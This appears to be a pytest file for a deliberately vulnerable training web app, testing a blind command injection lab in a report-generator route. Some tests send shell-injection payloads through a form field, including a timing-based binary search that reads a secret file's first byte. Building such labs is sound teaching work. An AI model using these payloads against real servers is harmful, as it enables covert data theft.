import time

from app.categories.a03_injection.routes import CMD_SECRET_PATH


def test_generate_report_legitimate_submission_returns_standard_response(client):
    response = client.post("/a03/generate-report", data={"report_name": "quarterly"})
    assert response.status_code == 200
    assert b"Your report is being generated. Check back later." in response.data


def test_generate_report_confirms_blind_execution_via_timing(client):
    start = time.monotonic()
    client.post("/a03/generate-report", data={"report_name": "baseline"})
    baseline_elapsed = time.monotonic() - start

    start = time.monotonic()
    response = client.post(
        "/a03/generate-report", data={"report_name": "x; sleep 1.2 #"}
    )
    injected_elapsed = time.monotonic() - start

    assert response.status_code == 200
    # the response text is identical either way -- only timing differs
    assert b"Your report is being generated. Check back later." in response.data
    assert injected_elapsed - baseline_elapsed > 0.8


def test_generate_report_blind_extraction_recovers_secret_first_byte(client):
    # Binary-search the ASCII value of the secret file's first character
    # using ONLY response timing as the oracle -- proving the route
    # genuinely leaks file content one bit at a time with zero output
    # ever shown, matching this project's established "prove it for
    # real, through the actual HTTP-level route" discipline. The
    # `printf %d \'X` construct is a POSIX shell trick for getting a
    # character's ordinal (ASCII) value -- live-verified during this
    # plan's brainstorming against this exact machine's /bin/sh.
    low, high = 0, 255
    while low < high:
        mid = (low + high) // 2
        payload = (
            f"x; [ $(printf %d \\'$(head -c1 {CMD_SECRET_PATH})) -gt {mid} ] "
            f"&& sleep 1.2 #"
        )
        start = time.monotonic()
        client.post("/a03/generate-report", data={"report_name": payload})
        elapsed = time.monotonic() - start
        if elapsed > 0.8:
            low = mid + 1
        else:
            high = mid
    assert low == 75  # ASCII 'K', the secret file's first character


def test_generate_report_still_works_with_teaching_text_hidden(app, client):
    from app.core.models import Settings
    from app.extensions import db

    with app.app_context():
        settings = Settings.get()
        settings.show_explanations = False
        settings.show_exploit_instructions = False
        db.session.commit()

    response = client.post("/a03/generate-report", data={"report_name": "quarterly"})
    assert response.status_code == 200
    assert b"Your report is being generated. Check back later." in response.data
    assert b"Vulnerable vs. Secure" in response.data
    assert b"Detect" not in response.data
    assert b"Tasks" not in response.data


def test_generate_report_link_appears_in_overview_once_registered(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"Blind Command Injection via Report Generator" in response.data
    assert b'href="/a03/generate-report"' in response.data
